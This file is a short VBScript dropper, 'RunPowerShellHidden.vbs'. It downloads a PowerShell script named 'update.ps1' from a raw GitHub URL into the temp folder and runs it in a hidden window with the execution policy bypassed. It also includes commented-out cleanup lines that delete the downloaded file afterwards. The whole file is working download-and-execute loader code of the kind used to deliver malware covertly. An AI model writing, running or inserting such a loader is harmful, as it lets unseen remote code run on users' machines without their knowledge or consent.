' RunPowerShellHidden.vbs

Option Explicit

Dim objXMLHTTP, objADOStream, objFSO, objShell
Dim strPSURL, strPSName, strDownloadDir, strPSPath

' Configuration
strPSURL = "https://raw.githubusercontent.com/swagkarna/test1/main/update.ps1" ' Replace with your PowerShell script's raw URL
strPSName = "update.ps1"
strDownloadDir = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
strPSPath = strDownloadDir & "\" & strPSName

' Initialize objects
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Function to download the PowerShell script
Function DownloadPS(url, savePath)
    On Error Resume Next
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        objADOStream.Type = 1 ' adTypeBinary
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
        DownloadPS = True
    Else
        DownloadPS = False
    End If
    On Error GoTo 0
End Function

' Download the PowerShell script
If DownloadPS(strPSURL, strPSPath) Then
    ' Check if the PowerShell script exists
    If objFSO.FileExists(strPSPath) Then
        ' Execute the PowerShell script hidden
        objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & strPSPath & """", 0, False
        
        ' Optional: Wait for a certain period before cleanup (e.g., 60 seconds)
        ' WScript.Sleep 60000 ' Waits for 60,000 milliseconds (60 seconds)
        
        ' Optional: Delete the PowerShell script after execution
        ' Uncomment the following lines to enable cleanup
        ' On Error Resume Next
        ' objFSO.DeleteFile strPSPath, True
        ' If Err.Number <> 0 Then
        '     ' Handle deletion error if necessary
        ' End If
        ' On Error GoTo 0
    Else
        MsgBox "PowerShell script was downloaded but does not exist at the specified path.", vbCritical, "Error"
    End If
Else
    MsgBox "Failed to download the PowerShell script from: " & strPSURL, vbCritical, "Download Error"
End If

' Clean up objects
Set objXMLHTTP = Nothing
Set objADOStream = Nothing
Set objFSO = Nothing
Set objShell = Nothing